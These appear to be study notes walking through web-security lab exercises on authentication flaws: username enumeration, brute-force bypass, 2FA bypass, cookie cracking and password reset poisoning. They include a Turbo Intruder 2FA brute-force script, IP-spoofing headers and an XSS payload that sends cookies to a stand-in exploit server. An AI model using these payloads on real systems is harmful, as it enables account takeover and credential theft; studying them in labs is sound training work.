# Authentication vulnerabilities

## Auth — webhacking: login page Vuln

[Web Application Vulnerbility](/broken/pages/b354ea7c9a8047788c9d5b4abd55c9282d3b6168)

* The concept of authentication is closely related to security.
* Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality.
* They also expose additional attack surface for further exploits.
* Learn how to identify and exploit authentication vulnerabilities and how to bypass common protection measures.

## What is Authentication?

* Process of verifying the identity of a user or client.
* Authentication mechanisms rely on a range of technologies to verify one or more of the factors below.

### Types of authentication

* Something you \[know] — knowledge factors
  * password
  * answer to security question
* Something you \[have] — possession factors
  * physical object (mobile phone)
  * security token
* Something you \[are or do] — inherence factors
  * biometrics
  * patterns of behaviour

## Difference between Authentication and Authorisation

* Authentication = verify who a user claims to be.
* Authorisation = verify whether a user is allowed to do something.

## Arise of Authentication vulnerabilities

* Weak mechanisms that fail to adequately protect against brute-force attacks.
* Logic flaws or poor coding (broken authentication).

## Impact of vulnerable Authentication

* Bypass or brute-force can grant access to all data and functions and compromise high-privilege accounts.
* Low-privileged accounts might still grant an attacker access to commercially sensitive information.
* Access to additional pages increases attack surface.

## Vulnerabilities in Authentication mechanisms

* Vulnerabilities in password-based login
* Vulnerabilities in multi-factor authentication
* Vulnerabilities in other authentication mechanisms

## Preventing attacks on your own authentication mechanism

* Take care with user credentials / Audit
  * Never send any login data over unencrypted connections.
* Zero trust users
  * Implement an effective password policy.
  * Implement a simple password checker (e.g., zxcvbn).
* Prevent username enumeration
  * Use identical, generic error messages regardless of whether an attempted username is valid.
  * Return the same HTTP status code with each login request.
  * Make response times as indistinguishable as possible across scenarios.
* Implement robust brute-force protection
  * Implement strict, IP-based rate limiting.
  * Require CAPTCHA after many failed attempts (or similar mitigations).
* Triple your verification logic.
* Don't forget supplementary functionality
  * If the application allows users to register accounts, those flows may expose other vulnerabilities.
* Implement proper multi-factor authentication.

## 1. Password-Based Login Attacks

* User-registered passwords.
* Accounts assigned by administrator can be accessed by obtaining or guessing credentials.
* Brute-force attacks
  * Trial-and-error guesses.
  * Automated using wordlists of usernames and passwords.
  * Using basic logic and public knowledge.
* Brute-forcing password
  * Password policy makes it harder, but logical guessing and character-by-character attacks can be effective (e.g., using Burp Intruder).
* Username enumeration
  * Observing changes in website behaviour to identify valid usernames (status codes, error messages, response times).

#### Lab: Username enumeration via different responses

{% stepper %}
{% step %}
### Vulnerability

Username enumeration and password brute-force attacks.
{% endstep %}

{% step %}
### End-goal

Enumerate a valid username, then brute-force this user's password.
{% endstep %}

{% step %}
### Analysis

* Prepare wordlists of candidate usernames and candidate passwords.
* With Burp running, submit an invalid username and password.
* In Proxy > HTTP history, find the POST /login request.
* Highlight the value of the username parameter and send it to Intruder.
* In Intruder, the username parameter becomes a payload position. Select the Sniper attack type.
* On the Payloads tab, use a simple list payload and paste the list of candidate usernames. Start the attack.
* In the Results tab, examine the length column and note any differences; record the username in the payload column that looks different.
* Go back to the Positions tab, clear, then set the username parameter to the identified valid username.
* Add a payload position for the password parameter and use the candidate passwords list. Start the attack.
* Look for requests with a different status code (e.g., 302) to identify successful logins.

\[Cluster bomb attack can also enumerate username and password simultaneously.]
{% endstep %}

{% step %}
### Payload examples

```
username=§invalid-username§
username=identified-user&password=§invalid-password§
```
{% endstep %}
{% endstepper %}

#### Lab: Username enumeration via subtly different responses

{% stepper %}
{% step %}
### Vulnerability

Subtle username enumeration and password brute-force attacks.
{% endstep %}

{% step %}
### End-goal

Enumerate a valid username, then brute-force this user's password.
{% endstep %}

{% step %}
### Analysis

* Prepare wordlists for usernames and passwords.
* Submit an invalid username and password through Burp.
* In Proxy > HTTP history, find POST /login and send to Intruder.
* In Positions, set username as payload position and select Sniper.
* On Payloads, use a simple list. On the Options/Settings tab, under Grep-Extract add an extraction for the error message (e.g., "Invalid username or password").
* Run the attack. Notice an additional column (from the extraction) highlighting subtly different responses (e.g., typos or trailing spaces). Note the username that causes the subtle difference.
* Start a new attack with that username and password payloads. One request may return a 302 status code—note that password.

\[Cluster bomb can also be used.]
{% endstep %}

{% step %}
### Payload examples

```
username=§invalid-username§
username=identified-user&password=§invalid-password§
```
{% endstep %}
{% endstepper %}

#### Lab: Username enumeration via response timing

{% stepper %}
{% step %}
### Vulnerability

Enumeration via response timing differences.
{% endstep %}

{% step %}
### End-goal

Enumerate a valid username, then brute-force this user's password.
{% endstep %}

{% step %}
### Analysis

* Send invalid credentials and proxy through Burp. Send POST /login to Repeater with different invalid credentials.
* Note if too many invalid attempts cause IP blocking; X-Forwarded-For may be accepted to spoof IPs.
* Observe response times: invalid usernames may return quickly; requests with valid usernames may take longer (e.g., depending on password length).
* Send the request to Intruder, use the Pitchfork attack.
  * Add X-Forwarded-For header as a payload position (to spoof IPs).
  * Add username as payload position and set a very long password (e.g., 100 characters) to force timing differences.
  * Payload set 1: numbers range (1-100) to vary X-Forwarded-For. Payload set 2: list of usernames.
* In Results, enable "Response received" and "Response completed" columns. Identify responses with longer times to find valid usernames.
* Use another Intruder attack with the identified username and candidate passwords to find the password (302 status).
{% endstep %}

{% step %}
### Payload examples

(Use the described intrusion payload sets: X-Forwarded-For numeric range, username list, long password.)
{% endstep %}
{% endstepper %}

### Flawed brute-force protection

Best mitigations:

* Lock the account after too many failed login attempts.
* Block the remote user's IP address if they make too many login attempts.

#### Lab: Broken brute-force protection — IP block

{% stepper %}
{% step %}
### Vulnerability

Logic flaw in password brute-force protection (IP-based blocking bypassable).
{% endstep %}

{% step %}
### End-goal

Brute-force the victim's password and access their account.
{% endstep %}

{% step %}
### Analysis

* Credentials: weiner:peter. Victim username: carlos.
* Observe that 3 failed login attempts in a row cause a temporary IP block.
* Logging in with a valid account can reset the attempt counter.
* Send POST /login to Intruder. Create a Pitchfork attack with payload positions for both username and password.
* In Resource pool, set Maximum concurrent requests to 1.
* Payload set 1: list that alternates between your valid username and carlos (your username first, then carlos repeated many times).
* Payload set 2: candidate passwords aligned so that when your username is used the corresponding password is correct (to reset attempt counters).
* Start the attack, filter results to hide 200 status codes, sort by username, and check for 302 responses for carlos to identify a valid password.
{% endstep %}

{% step %}
### Payload

(Use the alternated username/password payload lists and resource pool rules described above.)
{% endstep %}
{% endstepper %}

### Account locking

* Failed login attempts leading to account lockouts may be abused for username enumeration.
* Attack approach:
  * Build a shortlist of likely usernames.
  * Choose a small shortlist of common passwords (not exceeding the login-attempt limit).
  * Use Burp Intruder to try each password with each username.

#### Lab: Username enumeration via account lock

{% stepper %}
{% step %}
### Vulnerability

Account locking contains a logic flaw enabling username enumeration.
{% endstep %}

{% step %}
### End-goal

Enumerate a valid username, brute-force their password, then access their account page.
{% endstep %}

{% step %}
### Analysis

* Send POST /Login to Intruder and select Cluster Bomb.
* Add payload to username parameter. Add an additional payload position at the end of the request body by clicking Add § twice (e.g., username=§invalid-username§\&password=example§§).
* Payload set 1: list of usernames.
* Payload set 2: Null payload type that generates N repeats (e.g., 5) so each username repeats multiple times—this simulates repeated failed attempts to lock accounts.
* Start the attack. Look for responses that are noticeably longer or contain "You have made too many incorrect login attempts" to identify valid usernames.
* Use a Sniper attack for the identified username: set password payloads and use a grep extraction on the error message. One password may result in absence of an error (successful attempt). Wait for account lock reset and then log in with identified credentials.
{% endstep %}

{% step %}
### Payload examples

```
username=§invalid-username§&password=example§§
```
{% endstep %}
{% endstepper %}

Workarounds for this protection:

* Gather likely usernames and a small shortlist of passwords.
* Use tools (e.g., Burp Intruder) to test each selected password with each username.

Note: Account locking may still fail against credential stuffing attacks (using large lists of breached username:password pairs).

### User rate limiting

* Many login requests within a short time causes IP blocking.
* Unblocking may be automatic after time, manual by admin, or after completing a CAPTCHA.
* Because rate limits are based on IPs, sometimes attackers can guess multiple passwords with one request (see "multiple credentials per request" lab).

#### Lab: Broken brute-force protection — multiple credentials per request

{% stepper %}
{% step %}
### Vulnerability

Logic flaws in brute-force protection where multiple credentials can be submitted in a single request (e.g., password array in JSON).
{% endstep %}

{% step %}
### End-goal

Brute-force Carlos's password and access his account (victim: carlos).
{% endstep %}

{% step %}
### Analysis

* Inspect POST /login: it submits credentials in JSON format.
* Send to Repeater and replace the password string with an array of candidate passwords, e.g.:

```json
"username": "carlos",
"password": [
  "123456",
  "password",
  "qwerty"
  ...
]
```

* Send the request. It may return 302 and log you in as carlos.
* Show response in browser, navigate to My account to access Carlos's page.
{% endstep %}

{% step %}
### Payload example

```json
"username": "carlos",
"password": [
  "123456",
  "password",
  "qwerty"
  ...
]
```
{% endstep %}
{% endstepper %}

### HTTP Basic Authentication

* Authentication via HTTP Basic Auth: credentials are Base64(user:pass) in the Authorization header.
* The browser manages the header.
* Risks include man-in-the-middle attacks if not using TLS.

## 2. Multi-factor authentication Attacks

* Many sites rely on single-factor (password). Multi-factor aims to add additional factors.
* Verifying the same factor twice is not true 2FA (e.g., sending codes to the same email that hosts the password).
* Email-based 2FA that reuses the same channel (email) is weak.

### Two-factor authentication tokens

* Physical tokens (RSA, keypad devices) or mobile apps (Google Authenticator) generate codes.
* Some sites send codes via SMS.

### Bypassing two-factor authentication

* If the user is "logged-in" after the first step (password) before they complete the second step, test whether you can directly access logged-in pages (skip to /my-account).
* Some sites do not check completion of the second step before loading pages.

#### Lab: 2FA simple bypass

{% stepper %}
{% step %}
### Vulnerability

Bypass the two-factor authentication where first step grants partial access before verification.
{% endstep %}

{% step %}
### End-goal

Access Carlos's account page.

* Your credentials: wiener:peter
* Victim: carlos:mantoya
{% endstep %}

{% step %}
### Analysis

* Log in to your account; a 2FA verification code is sent by email (use the email client button).
* Note the account URL (e.g., /my-account).
* Log out and log in as the victim. When prompted for the verification code, manually change the URL to /my-account.
* If the site does not enforce completion of the second step, you'll access the account page.
{% endstep %}

{% step %}
### Payload

Change the URL after login to /my-account.
{% endstep %}
{% endstepper %}

### Flawed two-factor verification logic

* Sites that set an account-identifying cookie before the second step can be abused: the cookie indicates which account the second step should verify.
* If the attacker can brute-force verification codes and can control the cookie value, they may login to arbitrary accounts without knowing passwords.

Example flow:

* POST /login-steps/first with username/password
* Server sets Set-Cookie: account=carlos and returns second step.
* POST /login-steps/second uses Cookie: account=carlos and verification-code to verify.

#### Lab: 2FA broken logic

{% stepper %}
{% step %}
### Vulnerability

Flawed 2FA logic where an attacker can set or manipulate which account is being verified.
{% endstep %}

{% step %}
### End-goal

Access Carlos's account page.

* Your credentials: wiener:peter
* Victim username: carlos
{% endstep %}

{% step %}
### Analysis

* With Burp running, examine the 2FA flow. Notice POST /login2 uses a verify parameter or cookie to indicate the account.
* Log out. Send GET /login2 to Repeater and change verify to "carlos" to trigger a temporary 2FA code for carlos.
* Log in with your username/password and submit an invalid 2FA code. Send the POST /login2 to Intruder.
* In Intruder, set verify=carlos and brute-force the mfa-code parameter.
* A 302 response indicates success; load that URL in the browser to access the account.
{% endstep %}

{% step %}
### Payload example (POST header/body)

Use your cookie with verify=carlos and brute-force the mfa-code:

```
POST /login2 HTTP/2
Host: ...web-security-academy.net
Cookie: session=...; verify=carlos
...
mfa-code=§0111§
```

Turbo Intruder script (example):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.BURP)

    for num in range(0, 10000):
        mfa_code = '{:04}'.format(num)
        engine.queue(target.req, mfa_code.rstrip())

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```
{% endstep %}
{% endstepper %}

### Brute-forcing 2FA verification codes

* Sites should protect against brute-forcing of short numeric 2FA codes (4-6 digits).
* Some apps log users out after too many incorrect codes, but this can be circumvented using Burp session handling macros and Turbo Intruder.

#### Lab: 2FA bypass using a brute-force attack

{% stepper %}
{% step %}
### Vulnerability

2FA vulnerable to brute-force.
{% endstep %}

{% step %}
### End-goal

Brute-force the 2FA code and access Carlos's account page.

* Victim: carlos:montoya
{% endstep %}

{% step %}
### Analysis

* With Burp, log in as carlos and note the 2FA verification process.
* Configure Burp Project Options > Sessions > Session Handling Rules to run a macro that logs in before each attempt:
  * Macro steps: GET /login, POST /login, GET /login2.
* Test the macro to confirm the flow reaches the page asking for the 4-digit code.
* Send POST /login2 to Intruder, add payload position to mfa-code, and choose Numbers payload 0-9999 with 4 digits.
* In Resource pool, set max concurrent requests to 1. Start the attack.
* One request will return 302; open the response in browser and navigate to My account.
{% endstep %}

{% step %}
### Payload (Turbo Intruder example)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.BURP)

    for num in range(0, 10000):
        mfa_code = '{:04}'.format(num)
        engine.queue(target.req, mfa_code.rstrip())

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```
{% endstep %}
{% endstepper %}

## 3. Vulnerabilities in other authentication mechanisms

* Keeping users logged in typically uses a "remember me" token stored in a persistent cookie.
* Processing this cookie may allow bypassing the login process.
* Some sites generate this cookie from predictable concatenation of values (username, timestamps) or even include the password.
* Some sites simply Base64-encode values; Base64 is reversible.
* If a cookie includes a hash with no salt and the algorithm is known, offline cracking is possible using wordlists.

#### Lab: Brute-forcing a stay-logged-in cookie

{% stepper %}
{% step %}
### Vulnerability

The stay-logged-in cookie is vulnerable to brute forcing.
{% endstep %}

{% step %}
### End-goal

Brute-force Carlos's cookie to gain access to /my-account.

* Your credentials: wiener:peter
* Victim: carlos
{% endstep %}

{% step %}
### Analysis

* Log in and observe a stay-logged-in cookie; it's Base64 encoded.
* Decoding reveals username:md5HashOfPassword (e.g., wiener:51dc30...).
* Confirm the hash is MD5 by hashing your password and comparing.
* This indicates the cookie format: base64(username + ':' + md5(password)).
* In Proxy > HTTP history, highlight the stay-logged-in cookie and send to Intruder.
* Add payload positions and payload processing rules:
  * Hash: MD5
  * Add prefix: :
  * Encode: Base64
* Change the prefix to the victim's username (carlos) and run the attack with password candidate list.
* Use a grep match for presence of "update email" on /my-account to detect success.
{% endstep %}

{% step %}
### Payload outline

* Target: stay-logged-in cookie
* Change ID to the victim you are attacking
* Password list
* Payload processing rules:
  * Hash: MD5
  * Add prefix: \<victim\_username>:
  * Base64-encode
* Grep match: "update email"
{% endstep %}
{% endstepper %}

* Attackers can also steal "remember me" cookies via XSS.
* Open-source frameworks may document cookie construction, aiding attacks.
* Sometimes hashes correspond to known password lists, enabling trivial cracking.

#### Lab: Offline password cracking / XSS

{% stepper %}
{% step %}
### Vulnerability

The site stores a user's password hash in a cookie and the site has a stored XSS in comments.
{% endstep %}

{% step %}
### End-goal

Obtain Carlos's stay-logged-in cookie, crack the password, log in and delete his account.

* Your credentials: wiener:peter
* Victim: Carlos
{% endstep %}

{% step %}
### Analysis

* Investigate stay-logged-in cookie (Base64 encoded).
* In Proxy > HTTP history, inspect the login response to see the cookie (username:md5HashOfPassword).
* To steal the cookie, exploit stored XSS in comment functionality: post a comment with `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
* On your exploit server, check access logs for a GET request from the victim containing their cookie.
* Decode the cookie in Burp Decoder. Extract hash and search online; the password may be revealed (e.g., "onceuponatime").
* Log in as the victim and delete their account.
{% endstep %}
{% endstepper %}

### Resetting user password

* Password reset flows rely on alternative methods (email, tokens). Flaws in these flows can compromise accounts.

1. Sending password by email
   * Sending current passwords implies insecure storage (not possible if handled securely).
   * Sending new passwords via email relies on email channel security and expiry.
   * Man-in-the-middle or compromised email accounts can result in compromise.
2. Resetting password using URL
   * Reset URLs may include user-identifying parameters that are guessable.
   * Proper implementations use unguessable tokens (long, high-entropy) that expire and are destroyed after use.
   * Some implementations fail to revalidate tokens at the reset form, enabling attacks where a token generated for one account is reused to reset another.

#### Lab: Password reset broken logic

{% stepper %}
{% step %}
### Vulnerability

Password reset functionality contains logic flaws.
{% endstep %}

{% step %}
### End-goal

Reset Carlos's password then login to his My account.

* Your credentials: wiener:peter
* Victim: carlos
{% endstep %}

{% step %}
### Analysis

* Request a password reset for your account and observe the reset email in the email client.
* In Proxy > HTTP history, inspect the token included in the reset URL.
* POST /forgot-password?temp-forgot-password-token contains username as a hidden input.
* Send the POST to Repeater and confirm tokens are required by deleting the token value in both URL and body.
* Request a fresh reset, then in POST change token values to empty and replace username with "carlos", set a new password and send.
* If the application does not require the token for the POST, the password for carlos can be changed directly.
* Login as carlos with the new password.
{% endstep %}

{% step %}
### Payload

Delete the token and replace your username with the victim's username in the POST.
{% endstep %}
{% endstepper %}

Dynamic reset URLs can also be vulnerable to password reset poisoning if the link generation depends on attacker-controlled input (Host header, X-Forwarded-Host, etc.).

### Password reset poisoning

* Attack overview:
  1. Attacker submits a reset for victim.
  2. Intercepts the server's outgoing generation and modifies Host or related headers so the reset link points to attacker-controlled domain.
  3. The victim receives a genuine email with a token, but the URL points to the attacker's domain.
  4. If the victim clicks that link (or an email scanner does), the token is sent to attacker-controlled server.
  5. Attacker uses the stolen token on the real site to reset the password.

#### Lab: Basic password reset poisoning

{% stepper %}
{% step %}
### Vulnerability

Vulnerable to basic password reset poisoning.
{% endstep %}

{% step %}
### End-goal

Get Carlos to click a link in email to compromise his account.

* Solve the lab by logging in as carlos.
* Credentials: wiener:peter for the attacker.
{% endstep %}

{% step %}
### Analysis

* On the login page, trigger forgot password for your own account and inspect the reset email on the exploit server.
* In Burp HTTP history, find POST /forgot-password that triggers the email; send it to Repeater.
* Modify the Host header to an arbitrary value and send; email will contain the manipulated host in the URL.
* Set Host to your exploit server domain and change username to carlos; send request.
* Check exploit server access log for GET /forgot-password with temp-forgot-password-token. Copy the token.
* Replace token in the genuine email URL with the stolen token, load in browser, and reset carlos's password.
{% endstep %}
{% endstepper %}

#### Lab: Password reset poisoning via middleware

{% stepper %}
{% step %}
### Vulnerability

Password reset poisoning via X-Forwarded-Host or similar middleware headers.
{% endstep %}

{% step %}
### End-goal

Steal Carlos's reset token via exploit server.

* Credentials: wiener:peter (attacker).
{% endstep %}

{% step %}
### Analysis

* In Burp, find POST /forgot-password and note that X-Forwarded-Host is supported.
* Set X-Forwarded-Host to YOUR-EXPLOIT-SERVER-ID.exploit-server.net and username to carlos. Send request.
* On the exploit server, check access log for GET /forgot-password?temp-forgot-password-token and copy the token.
* Use the real reset email URL, replace its token with the stolen token, and reset Carlos's password.
{% endstep %}
{% endstepper %}

#### Lab: Password reset poisoning via dangling markup

{% stepper %}
{% step %}
### Vulnerability

Password reset poisoning via dangling markup and unsanitised raw HTML email content.
{% endstep %}

{% step %}
### End-goal

Trick Carlos (or an email scanner) into sending his password to your exploit server.

* Credentials: wiener:peter (attacker).
{% endstep %}

{% step %}
### Analysis

* Request a password reset and check the exploit server for the reset email.
* The rendered email may be sanitized, but the "view raw HTML" option may show unsanitised content.
* Modify the Host header to include an injected payload (e.g., Host: LAB-ID:web:arbitraryport) to reflect it inside a link as an unescaped single-quoted string, followed by the new password.
* Inject dangling-markup payload via Host header to point to exploit server, causing the email body to contain a link leading to the exploit server with the password.
* Check exploit server access log for requests that include the password.
* Use the stolen password to log in as carlos.
{% endstep %}
{% endstepper %}

### Changing user passwords

* Changing a password usually requires current password and new password (twice).
* Errors displayed in this flow can leak information useful for brute-forcing.

#### Lab: Password brute-force via password change

{% stepper %}
{% step %}
### Vulnerability

Errors revealed during password change leak whether the current password is correct.
{% endstep %}

{% step %}
### End-goal

Use a candidate password list to brute-force Carlos's current password via the change-password flow.

* Your credentials: wiener:peter
* Victim: carlos
{% endstep %}

{% step %}
### Analysis

* Log in and examine the password change POST /my-account/change-password.
* Username may be submitted as a hidden input.
* Observe different error messages:
  * If current password is wrong but new passwords match: account lock message.
  * If new passwords don't match: "New passwords do not match".
  * Use this to enumerate correct current password.
* Submit a request with username=carlos, current-password=§candidate§, new-password-1=123, new-password-2=abc (different).
* Send to Intruder with payload list of candidate passwords in current-password.
* Add grep match for "New passwords do not match".
* Run attack. The response containing the grep match reveals the correct current password.
* Log out and log in as carlos with the discovered password.
{% endstep %}

{% step %}
### Payload example

Use POST body:

```
username=carlos&current-password=§candidate-password§&new-password-1=123&new-password-2=abc
```

Payloads: candidate password list. Grep match: "New passwords do not match".
{% endstep %}
{% endstepper %}

***

End of document.
